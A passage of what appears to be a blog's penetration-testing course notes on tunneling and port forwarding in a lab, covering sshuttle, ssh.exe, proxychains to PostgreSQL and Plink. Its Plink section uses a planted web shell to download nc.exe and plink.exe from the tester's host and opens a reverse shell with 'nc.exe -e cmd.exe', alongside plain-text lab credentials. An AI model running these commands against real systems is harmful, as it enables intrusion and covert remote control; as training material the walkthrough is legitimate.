+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/rdyn-port]
+└─$ smbclient -L //172.16.200.217/ -U hr_admin --password=Welcome1234
+
+    Sharename       Type      Comment
+    ---------       ----      -------
+    ADMIN$          Disk      Remote Admin
+    C$              Disk      Default share
+    IPC$            IPC       Remote IPC
+    Scripts         Disk      
+    Users           Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 172.16.200.217 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;We&amp;#39;re now connecting to HRSHARES as if we are on the same network.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We used sshuttle to create a VPN-like env.  This allowed us to transparently conn to HRSHARES from our Kali machine as if were on the same network as PGDATABASE01.&lt;/p&gt;
+&lt;h4&gt;18.4 Port Forwarding with Windows Tools&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;Use ssh.exe and Plink to create port forwards on Windows.&lt;/li&gt;
+&lt;li&gt;Understand port forwarding with Netsh.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;ssh.exe&lt;/h5&gt;
+&lt;p&gt;Since version 1803, OpenSSH client has been bundled with Win by default, it has been available as a Feature-on-demand since 1709.  On versions of Win with SSH installed scp.exe, sftp.exe, ssh.exe along with other &lt;code&gt;ssh-*&lt;/code&gt; utils in &lt;code&gt;%systemdrive%\Windows\System32\OpenSSH&lt;/code&gt; locations by default.&lt;/p&gt;
+&lt;p&gt;We can connect to any SSH server we want, as long as we have creds.  Let&amp;#39;s practice by creating a remote dynamic port forward from MULTISERVER03 (Win) to our Kali machine.  In this scenario, only the RDP port 3389 is open on MULTISERVER03, we can RDP in, but we can&amp;#39;t bind any other ports to the WAN iface.&lt;/p&gt;
+&lt;p&gt;Use the RDP creds we found earlier to RDP into the server, then use &lt;code&gt;ssh.exe&lt;/code&gt; to create a remote dynamic port forward conn back to our Kali machine.  We can then use that to interact with Postgres DB on PGDATABASE01.&lt;/p&gt;
+&lt;p&gt;Make sure the SSH server is running on our Kali machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ systemctl status ssh
+● ssh.service - OpenBSD Secure Shell server
+     Loaded: loaded (/lib/systemd/system/ssh.service; enabled; preset: disabled)
+     Active: active (running) since Thu 2023-11-09 07:22:59 PST; 2 days ago
+       Docs: man:sshd(8)
+             man:sshd_config(5)
+    Process: 534413 ExecStartPre=/usr/sbin/sshd -t (code=exited, status=0/SUCCESS)
+   Main PID: 534414 (sshd)
+      Tasks: 1 (limit: 38054)
+     Memory: 1.5M
+        CPU: 1.121s
+     CGroup: /system.slice/ssh.service
+             └─534414 &amp;quot;sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Use &lt;code&gt;xfreerdp&lt;/code&gt; to conn to the RDP server on MULTISERVER03.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:$VM1
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Once connected, open &lt;code&gt;cmd.exe&lt;/code&gt; and determine whether SSH is available using &lt;code&gt;where ssh&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Users\rdp_admin&amp;gt;where ssh
+C:\Windows\System32\OpenSSH\ssh.exe
+
+C:\Users\rdp_admin&amp;gt;ssh.exe -V
+OpenSSH_for_Windows_8.1p1, LibreSSL 3.0.2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;SSH is on the machine, the version is &amp;gt;7.6 so we can use it for dynamic port forwards.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can now create the remote dynamic port forward to our Kali machine.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;ssh -N -R 9998 operator@192.168.45.182
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can check the SOCKS proxy port is open on our Kali machine with &lt;code&gt;ss&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ sudo ss -ntplu                             
+[sudo] password for operator: 
+Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                 
+...
+tcp      LISTEN    0         128              127.0.0.1:9998             0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=563619,fd=9)) 
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Update &lt;code&gt;/etc/proxychains.conf&lt;/code&gt; to use this socket.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ tail /etc/proxychains.conf
+[ProxyList]
+# add proxy here ...
+# meanwile
+# defaults set to &amp;quot;tor&amp;quot;
+#socks4 	127.0.0.1 9050
+
+# pcore-helios
+#socks5		127.0.0.1 6667
+
+socks5		127.0.0.1 9998
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;We can now run &lt;code&gt;psql&lt;/code&gt; through &lt;code&gt;proxychains&lt;/code&gt; to connect to PostgresSQL DB as the &lt;code&gt;postgres&lt;/code&gt; user, pass &lt;code&gt;D@t4basePassw0rd!&lt;/code&gt;.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling]
+└─$ proxychains psql -h 10.4.200.215 -U postgres
+[proxychains] config file found: /etc/proxychains.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] DLL init: proxychains-ng 4.16
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.200.215:5432  ...  OK
+Password for user postgres: 
+[proxychains] Strict chain  ...  127.0.0.1:9998  ...  10.4.200.215:5432  ...  OK
+psql (15.4 (Debian 15.4-1), server 12.12 (Ubuntu 12.12-0ubuntu0.20.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off)
+Type &amp;quot;help&amp;quot; for help.
+
+postgres=# \l
+                                                  List of databases
+    Name    |  Owner   | Encoding |   Collate   |    Ctype    | ICU Locale | Locale Provider |   Access privileges   
+------------+----------+----------+-------------+-------------+------------+-----------------+-----------------------
+ confluence | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ postgres   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | 
+ template0  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
+            |          |          |             |             |            |                 | postgres=CTc/postgres
+ template1  | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |            | libc            | =c/postgres          +
+            |          |          |             |             |            |                 | postgres=CTc/postgres
+(4 rows)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;The conn succeeded and we are interacting with the PostgresSQL DB on PGDATABASE01 through our Win dynamic port forward.&lt;/p&gt;
+&lt;h5&gt;Plink&lt;/h5&gt;
+&lt;p&gt;Admins may avoid leaving OpenSSH on their Win machines, there is no guarantee it will be present.  Even if we find a recent version of Win, the network admin may have removed it.&lt;/p&gt;
+&lt;p&gt;Network admins still need remote admin tools, Most networks have SSH servers somewhere, admins need tools to conn, so prior to OpenSSH being available the admins tool of choice was often PuTTY and its CLI variant &lt;a href=&quot;https://tartarus.org/~simon/putty-snapshots/htmldoc/Chapter7.html&quot;&gt;Plink&lt;/a&gt;.&lt;/p&gt;
+&lt;p&gt;A benefit to using popular network admin tools is they will rarely be flagged by traditional AV software.  This makes their usage relatively covert.&lt;/p&gt;
+&lt;p&gt;We will use Plink in this section as it is more common for us to have a shell instead of a GUI during an assessment.  The Plink manual explains that most of the functions we find with OpenSSH are available, however it lacks remote dynamic port forwarding.&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Many 3rd-party SSH clients for Windows provide port forwarding features. We&amp;#39;re using Plink in this case because it&amp;#39;s common, lightweight, and specifically designed to run on the command line.&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;We will familiarize ourselves with Plink, in this scenario we find MULTISERVER03 now has a web app on TCP port 80 with all other inbound ports blocked by a firewall.  RDP is no longer available.&lt;/p&gt;
+&lt;p&gt;We can compromise MULTISERVER03 through the web app, drop a web shell, and gain a reverse shell.  We have RDP creds, but cannot connect directly, OpenSSH has been removed, so we cannot create a remote port forward with it.  We can create a remote port forward using Plink.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We gain an interactive rev shell from MULTISERVER03.&lt;/li&gt;
+&lt;li&gt;We uploaded a basic web shell at &lt;code&gt;/umbraco/forms.aspx&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;We can browse to this URL and run any Win command we want.&lt;/li&gt;
+&lt;li&gt;In the context of &lt;code&gt;iis apppool\defaultapppool&lt;/code&gt; user.&lt;/li&gt;
+&lt;li&gt;We use the web shell to dl &lt;code&gt;nc.exe&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Use to send a rev shell back to Kali.
+&lt;em&gt;MULTISERVER03 is already &amp;quot;pre-compromised&amp;quot; in the lab. At this point, you can browse to /umbraco/forms.aspx on the HTTP server on port 80 on MULTISERVER03. You should see a webshell page, which will let you run arbitrary commands on MULTISERVER03.&lt;/em&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ find / -name nc.exe 2&amp;gt;/dev/null
+/usr/share/windows-resources/binaries/nc.exe
+
+
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ python3 -m http.server 80                                     
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+
+
+powershell wget -Uri http://192.168.45.182/nc.exe -OutFile C:\Windows\Temp\nc.exe
+
+C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.182 4446
+
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ nc -nvlp 4446
+listening on [any] 4446 ...
+connect to [192.168.45.182] from (UNKNOWN) [192.168.234.64] 53929
+Microsoft Windows [Version 10.0.20348.1487]
+(c) Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Next we want to get Plink on to MULTISERVER03.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ find / -name plink.exe 2&amp;gt;/dev/null
+/usr/share/windows-resources/binaries/plink.exe
+                                                                                         
+┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ sudo cp /usr/share/windows-resources/binaries/plink.exe ./
+
+
+c:\windows\system32\inetsrv&amp;gt;powershell wget -Uri http://192.168.45.182/plink.exe -Outfile C:\Windows\Temp\plink.exe
+powershell wget -Uri http://192.168.45.182/plink.exe -Outfile C:\Windows\Temp\plink.exe
+
+c:\windows\system32\inetsrv&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;With the Plink bin downloading we can now consider it&amp;#39;s use.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;In this case we will use Plink to setup a remote port forward so we can access the MULTISERVER03 RDP port from our Kali machine.  The syntax is similar to OpenSSH client remote port forward.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Option &lt;code&gt;-R&lt;/code&gt; .&lt;/li&gt;
+&lt;li&gt;Pass the socket we want to open on the Kali SSH server.&lt;/li&gt;
+&lt;li&gt;RDP server port on the lo iface of MULTISERVER03 that we will forward packets to.&lt;/li&gt;
+&lt;li&gt;Username &lt;code&gt;-l&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Password &lt;code&gt;-pw&lt;/code&gt;
+&lt;em&gt;This might log our Kali password somewhere undesirable! If we&amp;#39;re in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.&lt;/em&gt;&lt;/li&gt;
+&lt;li&gt;Limited Kali SSH user &lt;code&gt;admin&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;Passwd &lt;code&gt;faesh0Baeb8oocaV1aoV&lt;/code&gt; .&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-powershell&quot;&gt;C:\Windows\Temp\plink.exe -ssh -l admin -pw faesh0Baeb8oocaV1aoV -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.182
+C:\Windows\Temp\plink.exe -ssh -l admin -pw faesh0Baeb8oocaV1aoV -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.182
+The host key is not cached for this server:
+  192.168.45.182 (port 22)
+You have no guarantee that the server is the computer you
+think it is.
+The server&amp;#39;s ssh-ed25519 key fingerprint is:
+  ssh-ed25519 255 SHA256:puMx/kGvh1yFMewik0L8GNDyOzDYn0n0VZCLqLlkOww
+If you trust this host, enter &amp;quot;y&amp;quot; to add the key to Plink&amp;#39;s
+cache and carry on connecting.
+If you want to carry on connecting just once, without adding
+the key to the cache, enter &amp;quot;n&amp;quot;.
+If you do not trust this host, press Return to abandon the
+connection.
+Store key in cache? (y/n, Return cancels connection, i for more info) y
+Using username &amp;quot;admin&amp;quot;.
+Server refused to allocate pty
+Linux labhost 6.4.0-kali3-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.4.11-1kali1 (2023-08-21) x86_64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;em&gt;In much the same way that it&amp;#39;s not possible to accept the SSH client key cache prompt from a non-TTY shell on Linux, with some very limited shells with Plink on Windows, we also won&amp;#39;t be able to respond to this prompt. An easy solution in that case would be to automate the confirmation with cmd.exe /c echo y, piped into the plink.exe command. This will emulate the confirmation that we usually type when prompted. The entire command would be:&lt;/em&gt; &lt;code&gt;cmd.exe /c echo y | .\plink.exe -ssh -l kali -pw &amp;lt;YOUR PASSWORD HERE&amp;gt; -R 127.0.0.1:9833:127.0.0.1:3389 192.168.41.7&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;We can confirm that port has opened with &lt;code&gt;ss&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ sudo ss -ntplu                                             
+[sudo] password for operator: 
+Netid    State     Recv-Q    Send-Q       Local Address:Port        Peer Address:Port    Process                                                                                  
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=5270,fd=312))                                                      
+udp      UNCONN    0         0              224.0.0.251:5353             0.0.0.0:*        users:((&amp;quot;chrome&amp;quot;,pid=5270,fd=250))                                                      
+udp      UNCONN    0         0                  0.0.0.0:54691            0.0.0.0:*        users:((&amp;quot;openvpn&amp;quot;,pid=6801,fd=3))                                                       
+tcp      LISTEN    0         128              127.0.0.1:9833             0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=9349,fd=7))                                                          
+tcp      LISTEN    0         1                127.0.0.1:61553            0.0.0.0:*        users:((&amp;quot;autossh&amp;quot;,pid=4992,fd=3))                                                       
+tcp      LISTEN    0         128                0.0.0.0:22               0.0.0.0:*        users:((&amp;quot;sshd&amp;quot;,pid=8675,fd=3))                                                          
+tcp      LISTEN    0         5                  0.0.0.0:80               0.0.0.0:*        users:((&amp;quot;python3&amp;quot;,pid=7212,fd=3))                                                       
+tcp      LISTEN    0         128                   [::]:22                  [::]:*        users:((&amp;quot;sshd&amp;quot;,pid=8675,fd=4))                                                          
+tcp      LISTEN    0         10                       *:3389                   *:*        users:((&amp;quot;gnome-remote-de&amp;quot;,pid=2860,fd=15)) 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Port 9833 has opened on our lo iface.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;We can now conn to port 9983 on our Kali lo iface with &lt;code&gt;xfreerdp&lt;/code&gt; as the &lt;code&gt;rdp_admin&lt;/code&gt; user.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(operator㉿labhost)-[~/OffSec/redir-tunneling/win-plink]
+└─$ xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;The conn through the Plink remote port forward succeeds.&lt;/li&gt;
+&lt;/ul&gt;
+
+  &lt;/div&gt;
+
+  
+    &lt;footer class=&quot;blog-author-card&quot;&gt;
+      
+        &lt;img class=&quot;blog-author-avatar&quot; src=&quot;assets/static/img/bunny-punx.webp&quot; alt=&quot;m4xx3d0ut avatar&quot;&gt;
+      
+      &lt;div class=&quot;blog-author-details&quot;&gt;
+        &lt;strong class=&quot;blog-author-name&quot;&gt;m4xx3d0ut&lt;/strong&gt;
+        
+          &lt;div class=&quot;blog-author-title&quot;&gt;Chaos Operator&lt;/div&gt;
+        
+        
+          &lt;p class=&quot;blog-author-bio&quot;&gt;Architect of the Neon Terminal Core and Professional Technologist.&lt;/p&gt;
+        
+        
+          &lt;ul class=&quot;blog-author-social&quot;&gt;
+            
+              &lt;li&gt;&lt;a href=&quot;https://www.linkedin.com/in/paul-k-a3a18196/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;@m4xx3d0ut&lt;/a&gt;&lt;/li&gt;
+            
+          &lt;/ul&gt;
+        
+      &lt;/div&gt;
+    &lt;/footer&gt;
+  
+
+  
+    &lt;nav class=&quot;blog-article-nav&quot; aria-label=&quot;Post navigation&quot;&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;previous&quot;
+        
+        href=&quot;blog/dpi-evasion.html&quot;
+        data-default-href=&quot;blog/dpi-evasion.html&quot;
+        data-default-fragment=&quot;blog/fragments/dpi-evasion.html&quot;
+        data-fragment-href=&quot;blog/fragments/dpi-evasion.html&quot;
+        data-target-slug=&quot;dpi-evasion&quot;
+        data-post-slug=&quot;dpi-evasion&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Previous&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 19 — Beating Deep Packet Inspection&lt;/span&gt;
+      &lt;/a&gt;
+      &lt;span class=&quot;blog-article-nav-delimiter&quot; aria-hidden=&quot;true&quot;&gt;&amp;nbsp;•&amp;nbsp;&lt;/span&gt;
+      &lt;a
+        class=&quot;blog-article-nav-link&quot;
+        data-blog-nav=&quot;next&quot;
+        
+        href=&quot;blog/linux-priv-esc.html&quot;
+        data-default-href=&quot;blog/linux-priv-esc.html&quot;
+        data-default-fragment=&quot;blog/fragments/linux-priv-esc.html&quot;
+        data-fragment-href=&quot;blog/fragments/linux-priv-esc.html&quot;
+        data-target-slug=&quot;linux-priv-esc&quot;
+        data-post-slug=&quot;linux-priv-esc&quot;
+      &gt;
+        &lt;span class=&quot;blog-article-nav-meta&quot;&gt;Next&lt;/span&gt;
+        &lt;span class=&quot;blog-article-nav-title&quot;&gt;PEN-200 Module 17 — Linux Privilege Escalation Guide&lt;/span&gt;
+      &lt;/a&gt;
+    &lt;/nav&gt;
+  
+&lt;/article&gt;
+
+</code></pre>
+      </div>
+    </article>
+  
